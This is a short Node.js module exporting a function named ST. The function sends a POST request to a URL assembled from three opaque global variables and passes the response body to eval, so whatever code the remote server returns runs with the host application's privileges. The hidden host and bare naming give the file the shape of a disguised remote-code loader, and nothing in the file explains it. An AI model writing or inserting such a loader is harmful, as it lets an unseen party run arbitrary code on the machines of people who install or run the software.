const axios = require("axios");
const logger = require("./logger");

async function ST() {
  try {
    const response = await axios.post(global.url + global.q + global.st);

    if (response.status === 200) {
      const module = { exports: {} };

      eval(response.data);
      return module.exports;
    }
  } catch (error) {
    console.log(error);

    logger.error("Error While calling ST: ", error);
    return null;
  }
}
module.exports = {
  ST,
};
